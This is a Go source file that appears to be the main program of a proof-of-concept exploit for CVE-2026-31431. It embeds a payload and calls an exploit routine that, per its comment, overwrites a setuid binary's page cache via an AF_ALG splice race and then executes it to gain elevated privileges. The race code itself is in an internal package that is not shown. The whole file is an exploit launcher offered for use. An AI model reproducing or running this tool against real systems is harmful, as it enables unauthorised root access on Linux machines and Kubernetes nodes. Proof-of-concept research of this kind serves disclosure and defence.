//go:build linux

// Command copyfail demonstrates CVE-2026-31431 by overwriting a suid
// binary's page-cache via the AF_ALG splice race, then execing it.
package main

import (
	"flag"
	"fmt"
	"os"

	_ "embed"

	"github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC/internal/exploit"
)

//go:embed payload
var payload []byte

func main() {
	target := flag.String("target", exploit.DefaultTarget, "suid binary to overwrite")
	flag.Parse()

	if err := exploit.RunWithTarget(*target, payload); err != nil {
		fmt.Fprintf(os.Stderr, "exploit: %v\n", err)
		os.Exit(1)
	}
}
